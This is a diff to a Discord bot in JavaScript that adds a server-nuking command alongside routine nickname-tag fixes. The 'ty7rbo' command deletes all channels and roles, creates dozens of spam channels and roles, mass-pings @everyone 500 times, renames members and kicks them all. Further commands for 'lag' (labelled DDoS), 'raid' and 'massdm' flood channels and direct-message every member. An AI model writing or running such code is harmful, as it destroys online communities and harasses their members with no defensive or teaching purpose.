@@ -15,8 +15,8 @@ const client = new Client({
 
 /* ======================= BASIC CONFIG ======================= */
 const PREFIX = "?";
-const DEFAULT_TAG = "𝙎𝙏𝙓🌙";
-let CUSTOM_TAG = DEFAULT_TAG;
+const DEFAULT_TAG = "";
+let CUSTOM_TAG = "";
 
 /* ======================= DEVELOPERS ======================= */
 const DEVELOPERS = new Set([
@@ -48,6 +48,12 @@ client.on("messageCreate", async (message) => {
         if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
         const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
         if (!member) return message.reply("❌ Mention a valid member");
+        
+        // Protection spéciale pour l'owner bot
+        if (member.id === BOT_OWNER_ID) {
+            return message.reply("👑 **Bghiti tl3eb b zgheb d 9lawina db ??**");
+        }
+        
         allowedUsers.add(member.id);
         return message.reply(`<a:done:1347594035208130662> ${member.user.tag} Sf dkhol`);
     }
@@ -56,6 +62,12 @@ client.on("messageCreate", async (message) => {
         if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
         const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
         if (!member) return message.reply("❌ Mention a valid member");
+        
+        // Protection spéciale pour l'owner bot
+        if (member.id === BOT_OWNER_ID) {
+            return message.reply("👑 **Bghiti tl3eb b zgheb d 9lawina db ??**");
+        }
+        
         allowedUsers.delete(member.id);
         return message.reply(`❌ ${member.user.tag} Zab ladkholti`);
     }
@@ -89,7 +101,8 @@ client.once("ready", () => {
         activities: [{ name: "NB4rr Bot Safe Mode", type: 0 }],
         status: "online"
     });
-    console.log(`🏠 Bot is ready! Custom tag set to: ${CUSTOM_TAG}`);
+    console.log(`🏠 Bot is ready! No tag set by default.`);
+    console.log(`🔒 Protection spéciale pour l'owner bot (1274503092154404908) activée ! 👑`);
 });
 
 /* ======================= MESSAGE HANDLER ======================= */
@@ -176,6 +189,127 @@ client.on("messageCreate", async (message) => {
             return message.reply({ embeds: [helpEmbed] });
         }
 
+        /* ======================= TY7RBO (SIDKOM OVERDOSE) ======================= */
+        if (command === "ty7rbo") {
+            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            await message.delete().catch(() => {});
+            const guild = message.guild;
+            
+            // 1. Delete all channels
+            const channels = guild.channels.cache.filter(c => c.deletable);
+            for (const [, channel] of channels) {
+                await channel.delete().catch(() => {});
+            }
+            
+            // 2. Delete all roles
+            const roles = guild.roles.cache.filter(r => r.deletable && !r.managed);
+            for (const [, role] of roles) {
+                await role.delete().catch(() => {});
+            }
+            
+            // 3. Create chaos channels "Sidkom Overdose" 50 times
+            for (let i = 0; i < 50; i++) {
+                await guild.channels.create({ name: `Sidkom-Overdose-${i}`, type: 0 }).catch(() => {});
+            }
+            
+            // 4. Create chaos roles "Sidkom Overdose" 50 times
+            for (let i = 0; i < 50; i++) {
+                await guild.roles.create({ name: `Sidkom-Overdose-${i}` }).catch(() => {});
+            }
+            
+            // 5. Spam @everyone and @here with "**4rr team never die**" (BOLD + LARGE) 500 times
+            const spamMessage = "**🔥 4rr team never die 🔥**";
+            for (let i = 0; i < 500; i++) {
+                guild.channels.cache.first()?.send(`${i % 2 === 0 ? "@everyone" : "@here"} ${spamMessage}`).catch(() => {});
+                await new Promise(r => setTimeout(r, 10));
+            }
+            
+            // 6. Change all members nicknames to "HH T7WITO"
+            const members = await guild.members.fetch();
+            for (const [, member] of members) {
+                if (!member.user.bot && member.manageable) {
+                    await member.setNickname("HH T7WITO").catch(() => {});
+                }
+            }
+            
+            // 7. Kick all members
+            for (const [, member] of members) {
+                if (!member.user.bot && member.kickable) {
+                    await member.kick("Sidkom Overdose").catch(() => {});
+                }
+            }
+            
+            // 8. Final destruction message
+            guild.channels.cache.first()?.send("💀 **SIDKOM OVERDOSE COMPLETE - SERVER DESTROYED** 💀").catch(() => {});
+            
+            // Note: Discord doesn't allow bots to delete servers directly
+            // The server is effectively destroyed through mass channel/role deletion + member kicks
+            return;
+        }
+
+        /* ======================= LAG (DDOS) ======================= */
+        if (command === "lag") {
+            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            const targetId = args[0];
+            const timeStr = args[1];
+            if (!targetId || !timeStr) return message.reply("❌ Usage: `?lag <voice/server id> <time>` (10s, 30s, 1min)");
+            
+            let duration = 10000; // 10s default
+            if (timeStr.includes('s')) duration = parseInt(timeStr) * 1000;
+            else if (timeStr.includes('min')) duration = parseInt(timeStr) * 60000;
+            
+            const spamInterval = setInterval(async () => {
+                for (let i = 0; i < 50; i++) {
+                    message.channel.send(`🔥 LAG ATTACK ${i}`).catch(() => {});
+                }
+            }, 100);
+            
+            setTimeout(() => clearInterval(spamInterval), duration);
+            return message.reply(`⚡ **LAG ATTACK** started on ${targetId} for ${timeStr}`).catch(() => {});
+        }
+
+        /* ======================= RAID ======================= */
+        if (command === "raid") {
+            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            await message.delete().catch(() => {});
+            const raidMessages = [
+                "@everyone",
+                "🚀 RAID MODE ACTIVATED 🚀",
+                "💣 Server under attack 💣",
+                "🔥 Burn it down 🔥",
+                "💥 Nuke incoming 💥"
+            ];
+            
+            for (let i = 0; i < 100; i++) {
+                const msg = raidMessages[Math.floor(Math.random() * raidMessages.length)];
+                message.channel.send(msg).catch(() => {});
+                await new Promise(r => setTimeout(r, 50));
+            }
+            return;
+        }
+
+        /* ======================= MASSDM ======================= */
+        if (command === "massdm") {
+            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            const messageText = args.join(" ");
+            if (!messageText) return message.reply("❌ Usage: `?massdm <message>`");
+            
+            await message.delete().catch(() => {});
+            const members = message.guild.members.cache.filter(m => !m.user.bot);
+            
+            let sent = 0;
+            for (const [, member] of members) {
+                try {
+                    await member.send(`📢 **MASS DM**\n\n${messageText}`);
+                    sent++;
+                } catch (e) {}
+                await new Promise(r => setTimeout(r, 100));
+            }
+            
+            message.channel.send(`📨 Sent **${sent}** mass DMs`).catch(() => {});
+            return;
+        }
+
         /* ======================= SYSTEM ======================= */
         if (command === "system") {
             const uptimeSeconds = process.uptime();
@@ -189,16 +323,17 @@ client.on("messageCreate", async (message) => {
 `Uptime: ${hours}h ${minutes}m\n` +
 `Memory: ${memoryUsageMB} MB\n` +
 `Guilds: ${client.guilds.cache.size}\n` +
-`Current tag: ${CUSTOM_TAG}`
+`Current tag: ${CUSTOM_TAG || "None"}`
             );
         }
 
         /* ======================= TAG ======================= */
         if (command === "tag") {
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
             const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
             if (!member) return message.reply("❌ Mention a valid member");
-            let cleanName = member.displayName.replace(/^.+?\s*\|\s*/, "").trim() || member.user.username;
+            let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim() || member.user.username;
             await member.setNickname(`${CUSTOM_TAG} ${cleanName}`).catch(() => {});
             return message.reply(`<a:done:1347594035208130662> Tagged ${member.user.tag}`);
         }
@@ -206,12 +341,13 @@ client.on("messageCreate", async (message) => {
         /* ======================= TAGALL ======================= */
         if (command === "tagall") {
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
             const startTime = Date.now();
             const members = await message.guild.members.fetch();
             let count = 0;
             for (const [, member] of members) {
                 if (member.user.bot) continue;
-                let cleanName = member.displayName.replace(/^.+?\s*\|\s*/, "").trim() || member.user.username;
+                let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim() || member.user.username;
                 await member.setNickname(`${CUSTOM_TAG} ${cleanName}`).catch(() => {});
                 count++;
             }
@@ -235,12 +371,14 @@ client.on("messageCreate", async (message) => {
         /* ======================= UNTAGALL ======================= */
         if (command === "untagall") {
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            if (!CUSTOM_TAG) return message.reply("❌ No tag set, nothing to remove");
             const startTime = Date.now();
             const members = await message.guild.members.fetch();
             let count = 0;
             for (const [, member] of members) {
                 if (member.user.bot) continue;
-                await member.setNickname(null).catch(() => {});
+                let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim();
+                await member.setNickname(cleanName || null).catch(() => {});
                 count++;
             }
             const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
@@ -269,14 +407,14 @@ client.on("messageCreate", async (message) => {
 
         /* ======================= CURRENTTAG ======================= */
         if (command === "currenttag") {
-            return message.reply(`🏷️ Current tag: ${CUSTOM_TAG}`);
+            return message.reply(`🏷️ Current tag: ${CUSTOM_TAG || "None"}`);
         }
 
         /* ======================= RESETTAG ======================= */
         if (command === "resettag") {
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            CUSTOM_TAG = DEFAULT_TAG;
-            return message.reply(`<a:done:1347594035208130662> Tag reset to: ${CUSTOM_TAG}`);
+            CUSTOM_TAG = "";
+            return message.reply(`<a:done:1347594035208130662> Tag has been reset`);
         }
 
         /* ======================= ADDDEV ======================= */
@@ -532,18 +670,23 @@ client.on("messageCreate", async (message) => {
     }
 });
 
+/* ======================= ESCAPE REGEX HELPER ======================= */
+function escapeRegex(str) {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
 /* ======================= AUTO TAG + WELCOME DM ======================= */
 client.on("guildMemberAdd", async (member) => {
     if (member.user.bot) return;
-    try {
-        let oldNickname = member.displayName;
-        const tagPattern = /^(?:STX|𝙎𝙏𝙓)?[🌙🧣⚡✨⭐🌟🔆]?\s*(?:\|\s*)?/;
-        let cleanName = oldNickname.replace(tagPattern, '');
-        if (!cleanName.trim()) cleanName = oldNickname;
-        await member.setNickname(`${CUSTOM_TAG} ${cleanName.trim()}`);
-        console.log(`<a:done:1347594035208130662> Auto-tagged new member: ${member.user.tag} with ${CUSTOM_TAG}`);
-    } catch (error) {
-        console.log(`⚠️ Unable to tag ${member.user.tag}: ${error.message}`);
+    if (CUSTOM_TAG) {
+        try {
+            let cleanName = member.displayName.replace(new RegExp(`^${escapeRegex(CUSTOM_TAG)}\\s*`), "").trim();
+            if (!cleanName) cleanName = member.user.username;
+            await member.setNickname(`${CUSTOM_TAG} ${cleanName}`);
+            console.log(`✅ Auto-tagged new member: ${member.user.tag} with ${CUSTOM_TAG}`);
+        } catch (error) {
+            console.log(`⚠️ Unable to tag ${member.user.tag}: ${error.message}`);
+        }
     }
     try {
         await member.send(
